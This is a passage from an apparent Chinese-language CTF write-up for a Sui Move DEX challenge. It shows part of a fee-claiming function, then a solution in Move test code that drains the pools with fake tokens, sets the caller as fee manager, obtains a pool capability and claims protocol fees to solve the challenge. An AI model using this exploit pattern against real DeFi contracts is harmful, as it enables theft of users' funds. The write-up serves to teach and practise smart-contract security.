        let fee_1 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_1 &gt; get_balance&lt;X&gt;(pools)) {
            get_balance&lt;X&gt;(pools)

        } else {
            get_pool&lt;X, Y&gt;(pools).fee_amount_1
        };
        let fee_2 = if (get_pool&lt;X, Y&gt;(pools).fee_amount_2 &gt; get_balance&lt;Y&gt;(pools)) {
            get_balance&lt;Y&gt;(pools)

        } else {
            get_pool&lt;X, Y&gt;(pools).fee_amount_2
        };
        get_pool&lt;X, Y&gt;(pools).fee_amount_1 = 0;
        get_pool&lt;X, Y&gt;(pools).fee_amount_2 = 0;
        (
            coin::from_balance(balance::split(get_token&lt;X&gt;(pools), fee_1), ctx),
            coin::from_balance(balance::split(get_token&lt;Y&gt;(pools), fee_2), ctx)
        )

    }
</code></pre>
<h2 id="题解-1"><a class="header" href="#题解-1">题解</a></h2>
<p>具体的解题步骤如下：我们创建了假的<code>TOKEN1</code>，<code>TOKEN2</code>，<code>TOKEN3</code>，<code>TOKEN4</code>，然后调用<code>swap_b_2_a</code>和<code>swap_a_2_b</code>函数来耗尽pool（漏洞3），调用<code>set_fee_manager</code>函数将自己设置为<code>fee_manager</code>（漏洞1）,通过调用<code>create_pool</code>函数拿到<code>poolcap</code>（漏洞2），提取协议费用，最终拿到了flag。</p>
<pre><code class="language-move">        // ////////////// user 
        let user = @0x1235;
        test_scenario::next_tx(scenario, user);
        {
            let mut pools = test_scenario::take_shared&lt;Pools&gt;(scenario);
            
            let mut in = mint_for_testing&lt;TOKEN2&gt;(8000, test_scenario::ctx(scenario));
            let out = swap_b_2_a&lt;T_TOKEN1, TOKEN2&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));

            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);
   
            let mut in = mint_for_testing&lt;TOKEN1&gt;(8000, test_scenario::ctx(scenario));
            let out = swap_a_2_b&lt;TOKEN1, T_TOKEN2&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));
            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);

            set_fee_manager(&amp;mut pools, user, test_scenario::ctx(scenario));
            let mut cap = create_pool&lt;T_TOKEN1, T_TOKEN2&gt;(&amp;mut pools, 0, coin::zero&lt;T_TOKEN1&gt;(test_scenario::ctx(scenario)), coin::zero&lt;T_TOKEN2&gt;(test_scenario::ctx(scenario)), test_scenario::ctx(scenario));
            let (x, y) = claim_fees&lt;T_TOKEN1, T_TOKEN2&gt;(&amp;mut pools, &amp;mut cap, test_scenario::ctx(scenario));
            transfer::public_transfer(x, user);
            transfer::public_transfer(y, user);
            transfer::public_transfer(cap, user);

            test_scenario::return_shared(pools);
        };

        test_scenario::next_tx(scenario, user);
        {
            let mut pools = test_scenario::take_shared&lt;Pools&gt;(scenario);
            let mut in = mint_for_testing&lt;TOKEN4&gt;(8000, test_scenario::ctx(scenario));
            let out = swap_b_2_a&lt;T_TOKEN3, TOKEN4&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));
            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);
   
            let mut in = mint_for_testing&lt;TOKEN3&gt;(8000, test_scenario::ctx(scenario));
            let out = swap_a_2_b&lt;TOKEN3, T_TOKEN4&gt;(&amp;mut pools, &amp;mut in, test_scenario::ctx(scenario));
            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);

            set_fee_manager(&amp;mut pools, user, test_scenario::ctx(scenario));
            let mut cap = create_pool&lt;T_TOKEN3, T_TOKEN4&gt;(&amp;mut pools, 0, coin::zero&lt;T_TOKEN3&gt;(test_scenario::ctx(scenario)), coin::zero&lt;T_TOKEN4&gt;(test_scenario::ctx(scenario)), test_scenario::ctx(scenario));
            let (x, y) = claim_fees&lt;T_TOKEN3, T_TOKEN4&gt;(&amp;mut pools, &amp;mut cap, test_scenario::ctx(scenario));
            transfer::public_transfer(x, user);
            transfer::public_transfer(y, user);
            transfer::public_transfer(cap, user);


            test_scenario::return_shared(pools);
        };

        let user = @0x1235;
        test_scenario::next_tx(scenario, user);
        {
            let mut pools = test_scenario::take_shared&lt;Pools&gt;(scenario);
            is_solved(&amp;mut pools, test_scenario::ctx(scenario));
            test_scenario::return_shared(pools);
        };

        test_scenario::end(scenario_val);
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
